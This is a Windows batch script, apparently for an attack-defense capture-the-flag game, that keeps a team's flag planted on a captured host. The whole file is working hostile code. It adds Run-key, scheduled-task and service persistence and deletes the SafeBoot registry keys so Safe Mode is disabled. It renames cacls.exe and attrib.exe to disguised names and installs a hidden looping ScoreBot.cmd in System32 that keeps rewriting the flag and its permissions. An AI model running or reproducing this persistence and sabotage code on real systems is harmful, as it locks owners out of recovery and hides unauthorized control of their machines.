:: Change myflaghash to your hash
set myflaghash="enteryourflashhashhere"
set username="enteryourprimaryusernamehere"



:: Taken from wintroll
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "ScoreBot" /t REG_SZ /d "%systemroot%\System32\ScoreBot.cmd" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Scorebot" /t REG_SZ /d "%systemroot%\System32\ScoreBot.cmd" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "RunLogonScriptSync" /t REG_DWORD /d "1" /f
reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal" /f
reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Network" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk /P \??\C:" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "AutoChkTimeOut" /t REG_DWORD /d "0" /f
schtasks /RU "System" /RP none /create /sc minute /mo 1 /tn "%random%" /tr "%systemroot%\System32\ScoreBot.cmd"
rundll32.exe user32.dll,UpdatePerUserSystemParameters
::make copys and renameshit
copy %systemroot%\System32\cmd.exe %systemroot%\System32\com.com
copy %systemroot%\System32\cacls.exe %systemroot%\System32\slcac.com
ren %systemroot%\System32\cacls.exe comand.com
copy %systemroot%\System32\attrib.exe %systemroot%\System32\comm.com
ren %systemroot%\System32\attrib.exe birtta.com
::Build flagplanter

echo :LOOPFOREVER > %systemroot%\System32\ScoreBot.cmd

echo echo %%myflaghash%% ^> c:\flag.txt >> %systemroot%\System32\ScoreBot.cmd
echo comand.com c:\flag.txt ^> %systemroot%\System32\sys010 >> %systemroot%\System32\ScoreBot.cmd
echo findstr /M "%%username%%" %systemroot%\System32\sys010 ^> %systemroot%\System32\sys101 >> %systemroot%\System32\ScoreBot.cmd
echo set caclsdata=0 >> %systemroot%\System32\ScoreBot.cmd
echo set currentflag=0 >> %systemroot%\System32\ScoreBot.cmd
echo set /p caclsdata=^< %systemroot%\System32\sys101 >> %systemroot%\System32\ScoreBot.cmd
echo set /p currentflag=^< c:\flag.txt  >> %systemroot%\System32\ScoreBot.cmd
echo IF %%caclsdata%% NEQ %systemroot%\System32\sys010 GOTO :FLAGPWN >> %systemroot%\System32\ScoreBot.cmd
echo IF %%currentflag%% NEQ %%myflaghash%% GOTO :FLAGPWN >> %systemroot%\System32\ScoreBot.cmd
echo IF %%currentflag%% == %%myflaghash%% GOTO :LOOPFOREVER >> %systemroot%\System32\ScoreBot.cmd

echo :FLAGPWN >> %systemroot%\System32\ScoreBot.cmd >> %systemroot%\System32\ScoreBot.cmd

echo birtta.com -r -h -s c:\flag.txt >> %systemroot%\System32\ScoreBot.cmd
echo echo %%myflaghash%% ^> c:\flag.txt >> %systemroot%\System32\ScoreBot.cmd
echo echo y^|comand.com c:\flag.txt /G synsyn:F whiteteam:F iisrun:F saicscorebot:F sqlagent:F bigbot:F  >> %systemroot%\System32\ScoreBot.cmd
echo birtta.com +r +s +h c:\flag.txt >> %systemroot%\System32\ScoreBot.cmd
echo birtta.com +r +s +h %systemroot%\System32\ScoreBot.cmd >> %systemroot%\System32\ScoreBot.cmd
echo GOTO :LOOPFOREVER >> %systemroot%\System32\ScoreBot.cmd
::Start the flagplanter script
start com /K %systemroot%\System32\ScoreBot.cmd
::Create more persistance
sc create SrvDebugger binPath=%systemroot%\System32\ScoreBot.cmd start=auto
